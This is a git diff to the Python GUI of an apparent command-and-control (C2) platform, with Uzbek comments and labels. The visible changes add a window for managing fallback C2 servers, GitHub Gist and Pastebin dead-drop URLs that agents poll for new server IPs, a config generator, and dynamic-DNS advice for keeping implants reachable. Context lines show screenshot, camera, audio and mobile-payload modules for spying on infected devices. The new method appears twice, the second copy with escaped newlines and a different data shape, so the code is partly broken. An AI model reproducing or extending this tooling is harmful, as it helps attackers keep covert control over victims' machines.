@@ -11,6 +11,10 @@ import sys
 import os
 from datetime import datetime
 
+# Common modullarni import qilish
+sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
+from common.ip_updater import IPUpdater, create_ip_config
+
 # Modullarni import qilish
 sys.path.append(os.path.join(os.path.dirname(__file__), 'modules'))
 from screenshot_module import ScreenshotViewer
@@ -24,6 +28,25 @@ from mobile_payload_module import MobilePayloadGenerator
 class ModularC2GUI:
     """Modular C2 Platform GUI"""
     
+    def _get_local_ip(self):
+        """Local network IP ni aniqlash"""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.settimeout(0.1)
+            s.connect(('8.8.8.8', 80))
+            local_ip = s.getsockname()[0]
+            s.close()
+            return local_ip
+        except:
+            try:
+                hostname = socket.gethostname()
+                local_ip = socket.gethostbyname(hostname)
+                if not local_ip.startswith('127.'):
+                    return local_ip
+            except:
+                pass
+            return "127.0.0.1"
+    
     def __init__(self):
         self.root = tk.Tk()
         self.root.title("🎯 C2 Platform - Modular Version")
@@ -31,7 +54,7 @@ class ModularC2GUI:
         self.root.configure(bg='#1e1e1e')
         
         # TCP connection
-        self.tcp_host = "127.0.0.1"
+        self.tcp_host = self._get_local_ip()
         self.tcp_port = 9999
         self.connected = False
         self.tcp_socket = None
@@ -44,6 +67,10 @@ class ModularC2GUI:
         self.camera = CameraViewer(self.root, self.log_message)
         self.audio = AudioRecorder(self.root, self.log_message)
         self.mobile_payload = MobilePayloadGenerator(self.root, self.log_message)
+        
+        # IP Updater va fallback servers
+        self.ip_updater = IPUpdater()
+        self.fallback_servers = []  # [(host, port), ...]
         
         # UI yaratish
         self.create_ui()
@@ -104,7 +131,7 @@ class ModularC2GUI:
             font=('Consolas', 10),
             width=15
         )
-        self.server_entry.insert(0, "127.0.0.1")
+        self.server_entry.insert(0, self.tcp_host)
         self.server_entry.pack(side=tk.LEFT, padx=5)
         
         tk.Label(
@@ -155,6 +182,17 @@ class ModularC2GUI:
             fg='#ffffff',
             font=('Consolas', 10, 'bold'),
             width=10
+        ).pack(side=tk.LEFT, padx=5)
+        
+        # IP Management button
+        tk.Button(
+            top_frame,
+            text="🌐 IP Boshqarish",
+            command=self.open_ip_management,
+            bg='#9b59b6',
+            fg='#ffffff',
+            font=('Consolas', 10, 'bold'),
+            width=15
         ).pack(side=tk.LEFT, padx=5)
     
     def on_protocol_change(self, event=None):
@@ -552,7 +590,456 @@ class ModularC2GUI:
         self.log_message("🛠️ Payload generator ochilmoqda...")
         import subprocess
         subprocess.Popen([sys.executable, "gui/payload_generator_gui.py"])
+    
+    def open_ip_management(self):
+        """IP boshqarish oynasi"""
+        mgmt_win = tk.Toplevel(self.root)
+        mgmt_win.title("🌐 IP Boshqarish")
+        mgmt_win.geometry("700x600")
+        mgmt_win.configure(bg='#2c3e50')
         
+        # Title
+        title = tk.Label(mgmt_win, text="🌐 Dynamic IP Management",
+                        font=('Arial', 16, 'bold'), bg='#2c3e50', fg='white')
+        title.pack(pady=10)
+        
+        # Notebook for tabs
+        notebook = ttk.Notebook(mgmt_win)
+        notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        # Tab 1: Fallback Servers
+        fallback_frame = tk.Frame(notebook, bg='#34495e')
+        notebook.add(fallback_frame, text="🔄 Fallback Serverlar")
+        
+        tk.Label(fallback_frame, text="Agar primary server ishlamasa, bu serverlar sinab ko'riladi:",
+                font=('Arial', 10), bg='#34495e', fg='white').pack(pady=10)
+        
+        # Add server inputs
+        add_frame = tk.Frame(fallback_frame, bg='#34495e')
+        add_frame.pack(pady=10, fill=tk.X, padx=20)
+        
+        tk.Label(add_frame, text="Host/IP:", bg='#34495e', fg='white').grid(row=0, column=0, padx=5)
+        fallback_host = tk.Entry(add_frame, width=25)
+        fallback_host.grid(row=0, column=1, padx=5)
+        fallback_host.insert(0, "backup.example.com")
+        
+        tk.Label(add_frame, text="Port:", bg='#34495e', fg='white').grid(row=0, column=2, padx=5)
+        fallback_port = tk.Entry(add_frame, width=10)
+        fallback_port.grid(row=0, column=3, padx=5)
+        fallback_port.insert(0, "9999")
+        
+        tk.Label(add_frame, text="Protocol:", bg='#34495e', fg='white').grid(row=0, column=4, padx=5)
+        fallback_proto = ttk.Combobox(add_frame, values=["TCP", "HTTP", "HTTPS", "WebSocket"],
+                                     width=10, state="readonly")
+        fallback_proto.grid(row=0, column=5, padx=5)
+        fallback_proto.set("TCP")
+        
+        def add_fallback():
+            host = fallback_host.get().strip()
+            port = fallback_port.get().strip()
+            proto = fallback_proto.get()
+            
+            if host and port:
+                try:
+                    port_num = int(port)
+                    self.fallback_servers.append((host, port_num, proto))
+                    update_server_list()
+                    messagebox.showinfo("✅ Qo'shildi", f"{host}:{port} ({proto}) qo'shildi!")
+                    fallback_host.delete(0, tk.END)
+                    fallback_port.delete(0, tk.END)
+                except ValueError:
+                    messagebox.showerror("❌ Xato", "Port raqam bo'lishi kerak!")
+        
+        tk.Button(add_frame, text="➕ Qo'shish", command=add_fallback,
+                 bg='#27ae60', fg='white', font=('Arial', 9, 'bold')).grid(row=0, column=6, padx=5)
+        
+        # Server list
+        list_frame = tk.Frame(fallback_frame, bg='#34495e')
+        list_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
+        
+        tk.Label(list_frame, text="📋 Ro'yxat:", bg='#34495e', fg='white',
+                font=('Arial', 10, 'bold')).pack(anchor=tk.W)
+        
+        server_listbox = tk.Listbox(list_frame, height=10, font=('Courier', 9))
+        server_listbox.pack(fill=tk.BOTH, expand=True, pady=5)
+        
+        def update_server_list():
+            server_listbox.delete(0, tk.END)
+            for i, (host, port, proto) in enumerate(self.fallback_servers, 1):
+                server_listbox.insert(tk.END, f"{i}. {host}:{port} ({proto})")
+        
+        def remove_fallback():
+            selection = server_listbox.curselection()
+            if selection:
+                idx = selection[0]
+                removed = self.fallback_servers.pop(idx)
+                update_server_list()
+                messagebox.showinfo("✅ O'chirildi", f"{removed[0]}:{removed[1]} o'chirildi!")
+        
+        tk.Button(list_frame, text="🗑️ O'chirish", command=remove_fallback,
+                 bg='#e74c3c', fg='white').pack(pady=5)
+        
+        update_server_list()
+        
+        # Tab 2: IP Update Sources
+        update_frame = tk.Frame(notebook, bg='#34495e')
+        notebook.add(update_frame, text="🔍 IP Update")
+        
+        tk.Label(update_frame, text="GitHub Gist yoki Pastebin orqali IP update:",
+                font=('Arial', 10), bg='#34495e', fg='white').pack(pady=10)
+        
+        # GitHub Gist
+        gist_frame = tk.LabelFrame(update_frame, text="📝 GitHub Gist", bg='#34495e',
+                                  fg='white', font=('Arial', 10, 'bold'))
+        gist_frame.pack(fill=tk.X, padx=20, pady=10)
+        
+        tk.Label(gist_frame, text="Raw URL:", bg='#34495e', fg='white').pack(anchor=tk.W, padx=10, pady=5)
+        gist_url = tk.Entry(gist_frame, width=60)
+        gist_url.pack(fill=tk.X, padx=10, pady=5)
+        gist_url.insert(0, "https://gist.githubusercontent.com/user/id/raw/config.json")
+        
+        def add_gist():
+            url = gist_url.get().strip()
+            if url:
+                self.ip_updater.add_github_gist(url)
+                messagebox.showinfo("✅ Qo'shildi", "GitHub Gist URL qo'shildi!\n\nAgent har 5 daqiqada yangi IP tekshiradi.")
+        
+        tk.Button(gist_frame, text="➕ Gist URL Qo'shish", command=add_gist,
+                 bg='#27ae60', fg='white', font=('Arial', 9, 'bold')).pack(pady=10)
+        
+        # Pastebin
+        paste_frame = tk.LabelFrame(update_frame, text="📋 Pastebin", bg='#34495e',
+                                   fg='white', font=('Arial', 10, 'bold'))
+        paste_frame.pack(fill=tk.X, padx=20, pady=10)
+        
+        tk.Label(paste_frame, text="Raw URL:", bg='#34495e', fg='white').pack(anchor=tk.W, padx=10, pady=5)
+        paste_url = tk.Entry(paste_frame, width=60)
+        paste_url.pack(fill=tk.X, padx=10, pady=5)
+        paste_url.insert(0, "https://pastebin.com/raw/xxxxx")
+        
+        def add_pastebin():
+            url = paste_url.get().strip()
+            if url:
+                self.ip_updater.add_pastebin(url)
+                messagebox.showinfo("✅ Qo'shildi", "Pastebin URL qo'shildi!\n\nAgent har 5 daqiqada yangi IP tekshiradi.")
+        
+        tk.Button(paste_frame, text="➕ Pastebin URL Qo'shish", command=add_pastebin,
+                 bg='#27ae60', fg='white', font=('Arial', 9, 'bold')).pack(pady=10)
+        
+        # Tab 3: Config Generator
+        config_frame = tk.Frame(notebook, bg='#34495e')
+        notebook.add(config_frame, text="⚙️ Config Generator")
+        
+        tk.Label(config_frame, text="GitHub Gist uchun config yaratish:",
+                font=('Arial', 10), bg='#34495e', fg='white').pack(pady=10)
+        
+        gen_frame = tk.Frame(config_frame, bg='#34495e')
+        gen_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
+        
+        tk.Label(gen_frame, text="Primary IP:", bg='#34495e', fg='white').grid(row=0, column=0, sticky=tk.W, pady=5)
+        primary_ip = tk.Entry(gen_frame, width=30)
+        primary_ip.grid(row=0, column=1, pady=5, padx=10)
+        primary_ip.insert(0, "123.45.67.89")
+        
+        tk.Label(gen_frame, text="Backup IPs (har satrda 1ta):", bg='#34495e', fg='white').grid(row=1, column=0, sticky=tk.NW, pady=5)
+        backup_ips = tk.Text(gen_frame, height=5, width=30)
+        backup_ips.grid(row=1, column=1, pady=5, padx=10)
+        backup_ips.insert("1.0", "98.76.54.32\n11.22.33.44")
+        
+        tk.Label(gen_frame, text="Generated Config:", bg='#34495e', fg='white').grid(row=2, column=0, sticky=tk.NW, pady=10)
+        config_text = tk.Text(gen_frame, height=10, width=50)
+        config_text.grid(row=2, column=1, pady=10, padx=10)
+        
+        def generate_config():
+            primary = primary_ip.get().strip()
+            backups = [line.strip() for line in backup_ips.get("1.0", tk.END).split('\n') if line.strip()]
+            
+            if primary:
+                config = create_ip_config(primary, backups)
+                config_text.delete("1.0", tk.END)
+                config_text.insert("1.0", config)
+                messagebox.showinfo("✅ Tayyor", "Config yaratildi!\n\nBu JSON ni GitHub Gist ga yuklang.")
+        
+        def copy_config():
+            config = config_text.get("1.0", tk.END).strip()
+            self.root.clipboard_clear()
+            self.root.clipboard_append(config)
+            messagebox.showinfo("✅ Nusxalandi", "Config clipboard ga nusxalandi!")
+        
+        btn_frame = tk.Frame(gen_frame, bg='#34495e')
+        btn_frame.grid(row=3, column=1, pady=10)
+        
+        tk.Button(btn_frame, text="🔧 Generate", command=generate_config,
+                 bg='#3498db', fg='white', font=('Arial', 9, 'bold')).pack(side=tk.LEFT, padx=5)
+        tk.Button(btn_frame, text="📋 Copy", command=copy_config,
+                 bg='#27ae60', fg='white', font=('Arial', 9, 'bold')).pack(side=tk.LEFT, padx=5)
+        
+        # Tab 4: DDNS Info
+        ddns_frame = tk.Frame(notebook, bg='#34495e')
+        notebook.add(ddns_frame, text="🌐 DDNS Info")
+        
+        ddns_info = tk.Text(ddns_frame, wrap=tk.WORD, font=('Arial', 9), bg='#ecf0f1')
+        ddns_info.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        ddns_text = """🌐 Dynamic DNS (DDNS) Providers
+
+✅ TAVSIYA ETILADIGAN:
+
+1. DuckDNS (duckdns.org)
+   • To'liq bepul
+   • Cheksiz subdomain
+   • 5 daqiqada setup
+   • yourname.duckdns.org
+
+2. No-IP (noip.com)
+   • 3 ta domain bepul
+   • Eng mashhur
+   • yourname.ddns.net
+
+3. Cloudflare (cloudflare.com)
+   • Professional
+   • Bepul SSL/TLS
+   • DDoS protection
+
+📖 Batafsil ko'rsatma: docs/DYNAMIC_IP_GUIDE.md
+
+💡 DDNS ishlatish:
+   1. Account yarating
+   2. Domain oling (yourname.duckdns.org)
+   3. Auto-update script qo'shing
+   4. Agent'da domain ishlatng (IP emas!)
+   
+Example:
+   client.add_server('yourname.duckdns.org', 9999)
+"""
+        ddns_info.insert("1.0", ddns_text)
+        ddns_info.config(state=tk.DISABLED)
+        
+        tk.Button(ddns_frame, text="📖 Batafsil Ko'rsatma",
+                 command=lambda: os.startfile("docs/DYNAMIC_IP_GUIDE.md") if os.name == 'nt' else None,
+                 bg='#3498db', fg='white', font=('Arial', 10, 'bold')).pack(pady=10)
+    
+    def open_ip_management(self):
+        """IP boshqarish oynasi"""
+        mgmt_win = tk.Toplevel(self.root)
+        mgmt_win.title("🌐 IP Boshqarish")
+        mgmt_win.geometry("700x600")
+        mgmt_win.configure(bg='#2c3e50')
+        
+        # Title
+        title = tk.Label(mgmt_win, text="🌐 Dynamic IP Management",
+                        font=('Arial', 16, 'bold'), bg='#2c3e50', fg='white')
+        title.pack(pady=10)
+        
+        # Notebook
+        notebook = ttk.Notebook(mgmt_win)
+        notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        # Tab 1: Fallback Servers
+        fallback_frame = tk.Frame(notebook, bg='#34495e')
+        notebook.add(fallback_frame, text="🔄 Fallback Serverlar")
+        
+        tk.Label(fallback_frame, text="Agar primary server ishlamasa, bu serverlar sinab ko'riladi:",
+                font=('Arial', 10), bg='#34495e', fg='white').pack(pady=10)
+        
+        # Add server
+        add_frame = tk.Frame(fallback_frame, bg='#34495e')
+        add_frame.pack(pady=10, fill=tk.X, padx=20)
+        
+        tk.Label(add_frame, text="Host/IP:", bg='#34495e', fg='white').grid(row=0, column=0, padx=5)
+        fallback_host = tk.Entry(add_frame, width=25)
+        fallback_host.grid(row=0, column=1, padx=5)
+        fallback_host.insert(0, "backup.example.com")
+        
+        tk.Label(add_frame, text="Port:", bg='#34495e', fg='white').grid(row=0, column=2, padx=5)
+        fallback_port = tk.Entry(add_frame, width=10)
+        fallback_port.grid(row=0, column=3, padx=5)
+        fallback_port.insert(0, "9999")
+        
+        def add_fallback():
+            host = fallback_host.get().strip()
+            port = fallback_port.get().strip()
+            
+            if host and port:
+                try:
+                    port_num = int(port)
+                    self.fallback_servers.append((host, port_num))
+                    update_server_list()
+                    messagebox.showinfo("✅ Qo'shildi", f"{host}:{port} qo'shildi!")
+                    fallback_host.delete(0, tk.END)
+                    fallback_port.delete(0, tk.END)
+                except ValueError:
+                    messagebox.showerror("❌ Xato", "Port raqam bo'lishi kerak!")
+        
+        tk.Button(add_frame, text="➕ Qo'shish", command=add_fallback,
+                 bg='#27ae60', fg='white', font=('Arial', 9, 'bold')).grid(row=0, column=4, padx=5)
+        
+        # Server list
+        list_frame = tk.Frame(fallback_frame, bg='#34495e')
+        list_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
+        
+        tk.Label(list_frame, text="📋 Ro'yxat:", bg='#34495e', fg='white',
+                font=('Arial', 10, 'bold')).pack(anchor=tk.W)
+        
+        server_listbox = tk.Listbox(list_frame, height=10, font=('Courier', 9))
+        server_listbox.pack(fill=tk.BOTH, expand=True, pady=5)
+        
+        def update_server_list():
+            server_listbox.delete(0, tk.END)
+            for i, (host, port) in enumerate(self.fallback_servers, 1):
+                server_listbox.insert(tk.END, f"{i}. {host}:{port}")
+        
+        def remove_fallback():
+            selection = server_listbox.curselection()
+            if selection:
+                idx = selection[0]
+                removed = self.fallback_servers.pop(idx)
+                update_server_list()
+                messagebox.showinfo("✅ O'chirildi", f"{removed[0]}:{removed[1]} o'chirildi!")
+        
+        tk.Button(list_frame, text="🗑️ O'chirish", command=remove_fallback,
+                 bg='#e74c3c', fg='white').pack(pady=5)
+        
+        update_server_list()
+        
+        # Tab 2: IP Update
+        update_frame = tk.Frame(notebook, bg='#34495e')
+        notebook.add(update_frame, text="🔍 IP Update")
+        
+        tk.Label(update_frame, text="GitHub Gist yoki Pastebin orqali IP update:",
+                font=('Arial', 10), bg='#34495e', fg='white').pack(pady=10)
+        
+        # GitHub Gist
+        gist_frame = tk.LabelFrame(update_frame, text="📝 GitHub Gist", bg='#34495e',
+                                  fg='white', font=('Arial', 10, 'bold'))
+        gist_frame.pack(fill=tk.X, padx=20, pady=10)
+        
+        tk.Label(gist_frame, text="Raw URL:", bg='#34495e', fg='white').pack(anchor=tk.W, padx=10, pady=5)
+        gist_url = tk.Entry(gist_frame, width=60)
+        gist_url.pack(fill=tk.X, padx=10, pady=5)
+        gist_url.insert(0, "https://gist.githubusercontent.com/user/id/raw/config.json")
+        
+        def add_gist():
+            url = gist_url.get().strip()
+            if url:
+                self.ip_updater.add_github_gist(url)
+                messagebox.showinfo("✅ Qo'shildi", "GitHub Gist URL qo'shildi!\\n\\nAgent har 5 daqiqada yangi IP tekshiradi.")
+        
+        tk.Button(gist_frame, text="➕ Gist URL Qo'shish", command=add_gist,
+                 bg='#27ae60', fg='white', font=('Arial', 9, 'bold')).pack(pady=10)
+        
+        # Pastebin
+        paste_frame = tk.LabelFrame(update_frame, text="📋 Pastebin", bg='#34495e',
+                                   fg='white', font=('Arial', 10, 'bold'))
+        paste_frame.pack(fill=tk.X, padx=20, pady=10)
+        
+        tk.Label(paste_frame, text="Raw URL:", bg='#34495e', fg='white').pack(anchor=tk.W, padx=10, pady=5)
+        paste_url = tk.Entry(paste_frame, width=60)
+        paste_url.pack(fill=tk.X, padx=10, pady=5)
+        paste_url.insert(0, "https://pastebin.com/raw/xxxxx")
+        
+        def add_pastebin():
+            url = paste_url.get().strip()
+            if url:
+                self.ip_updater.add_pastebin(url)
+                messagebox.showinfo("✅ Qo'shildi", "Pastebin URL qo'shildi!\\n\\nAgent har 5 daqiqada yangi IP tekshiradi.")
+        
+        tk.Button(paste_frame, text="➕ Pastebin URL Qo'shish", command=add_pastebin,
+                 bg='#27ae60', fg='white', font=('Arial', 9, 'bold')).pack(pady=10)
+        
+        # Tab 3: Config Generator
+        config_frame = tk.Frame(notebook, bg='#34495e')
+        notebook.add(config_frame, text="⚙️ Config Generator")
+        
+        tk.Label(config_frame, text="GitHub Gist uchun config yaratish:",
+                font=('Arial', 10), bg='#34495e', fg='white').pack(pady=10)
+        
+        gen_frame = tk.Frame(config_frame, bg='#34495e')
+        gen_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
+        
+        tk.Label(gen_frame, text="Primary IP:", bg='#34495e', fg='white').grid(row=0, column=0, sticky=tk.W, pady=5)
+        primary_ip = tk.Entry(gen_frame, width=30)
+        primary_ip.grid(row=0, column=1, pady=5, padx=10)
+        primary_ip.insert(0, "123.45.67.89")
+        
+        tk.Label(gen_frame, text="Backup IPs (har satrda 1ta):", bg='#34495e', fg='white').grid(row=1, column=0, sticky=tk.NW, pady=5)
+        backup_ips = tk.Text(gen_frame, height=5, width=30)
+        backup_ips.grid(row=1, column=1, pady=5, padx=10)
+        backup_ips.insert("1.0", "98.76.54.32\\n11.22.33.44")
+        
+        tk.Label(gen_frame, text="Generated Config:", bg='#34495e', fg='white').grid(row=2, column=0, sticky=tk.NW, pady=10)
+        config_text = tk.Text(gen_frame, height=10, width=50)
+        config_text.grid(row=2, column=1, pady=10, padx=10)
+        
+        def generate_config():
+            primary = primary_ip.get().strip()
+            backups = [line.strip() for line in backup_ips.get("1.0", tk.END).split('\\n') if line.strip()]
+            
+            if primary:
+                config = create_ip_config(primary, backups)
+                config_text.delete("1.0", tk.END)
+                config_text.insert("1.0", config)
+                messagebox.showinfo("✅ Tayyor", "Config yaratildi!\\n\\nBu JSON ni GitHub Gist ga yuklang.")
+        
+        def copy_config():
+            config = config_text.get("1.0", tk.END).strip()
+            self.root.clipboard_clear()
+            self.root.clipboard_append(config)
+            messagebox.showinfo("✅ Nusxalandi", "Config clipboard ga nusxalandi!")
+        
+        btn_frame = tk.Frame(gen_frame, bg='#34495e')
+        btn_frame.grid(row=3, column=1, pady=10)
+        
+        tk.Button(btn_frame, text="🔧 Generate", command=generate_config,
+                 bg='#3498db', fg='white', font=('Arial', 9, 'bold')).pack(side=tk.LEFT, padx=5)
+        tk.Button(btn_frame, text="📋 Copy", command=copy_config,
+                 bg='#27ae60', fg='white', font=('Arial', 9, 'bold')).pack(side=tk.LEFT, padx=5)
+        
+        # Tab 4: DDNS Info
+        ddns_frame = tk.Frame(notebook, bg='#34495e')
+        notebook.add(ddns_frame, text="🌐 DDNS Info")
+        
+        ddns_info = tk.Text(ddns_frame, wrap=tk.WORD, font=('Arial', 9), bg='#ecf0f1')
+        ddns_info.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        ddns_text = """🌐 Dynamic DNS (DDNS) Providers
+
+✅ TAVSIYA ETILADIGAN:
+
+1. DuckDNS (duckdns.org)
+   • To'liq bepul
+   • Cheksiz subdomain
+   • 5 daqiqada setup
+   • yourname.duckdns.org
+
+2. No-IP (noip.com)
+   • 3 ta domain bepul
+   • Eng mashhur
+   • yourname.ddns.net
+
+3. Cloudflare (cloudflare.com)
+   • Professional
+   • Bepul SSL/TLS
+   • DDoS protection
+
+📖 Batafsil ko'rsatma: docs/DYNAMIC_IP_GUIDE.md
+
+💡 DDNS ishlatish:
+   1. Account yarating
+   2. Domain oling (yourname.duckdns.org)
+   3. Auto-update script qo'shing
+   4. Agent'da domain ishlatng (IP emas!)
+   
+Example:
+   client.add_server('yourname.duckdns.org', 9999)
+"""
+        ddns_info.insert("1.0", ddns_text)
+        ddns_info.config(state=tk.DISABLED)
+        
+        tk.Button(ddns_frame, text="📖 Batafsil Ko'rsatma",
+                 command=lambda: os.startfile("docs/DYNAMIC_IP_GUIDE.md") if os.name == 'nt' else None,
+                 bg='#3498db', fg='white', font=('Arial', 10, 'bold')).pack(pady=10)
+    
     def run(self):
         """GUI ishga tushirish"""
         self.root.mainloop()
